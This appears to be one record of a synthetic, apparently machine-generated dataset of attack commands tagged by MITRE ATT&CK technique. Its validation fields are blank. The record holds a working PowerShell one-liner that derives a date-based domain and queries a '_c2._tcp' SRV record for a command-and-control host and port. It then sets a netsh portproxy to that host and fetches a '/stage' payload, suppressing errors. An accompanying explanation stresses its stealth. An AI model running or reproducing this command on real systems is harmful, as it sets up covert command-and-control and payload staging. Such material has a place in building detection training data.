@@ -1,0 +1,21 @@
+{
+  "technique_id": "T1568",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "$base='relay'+(Get-Date -Format 'yyyyMM')+'.net';$d='_c2._tcp.'+$base;try{$srv=Resolve-DnsName $d -Type SRV -ErrorAction Stop|Select-Object -First 1;$target=$srv.NameTarget.TrimEnd('.');$port=[int]$srv.Port;$a=Resolve-DnsName $target -Type A -ErrorAction Stop;$ip=($a|Get-Random).IPAddress;netsh interface portproxy set v4tov4 listenaddress=127.0.0.1 listenport=$port connectaddress=$ip connectport=$port;Invoke-WebRequest -Uri ('http://127.0.0.1:'+ $port +'/stage') -UseBasicParsing -Headers @{SRV=$target;Dom=$base} -TimeoutSec 5}catch{}",
+  "explanation": "Uses SRV records to dynamically discover both the host and port for C2, resolves the SRV target, and forwards local traffic to the dynamically selected endpoint.",
+  "rationale_steps": [
+    "Query SRV to obtain service target and port, enabling dynamic parameterization.",
+    "Resolve target's A record and set up portproxy for stealthy indirection."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1568-0a23acf2-90bc6b6a",
+  "source_prompt_hash": "0a23acf2",
+  "timestamp_utc": "2025-09-30T09:39:46.357850Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
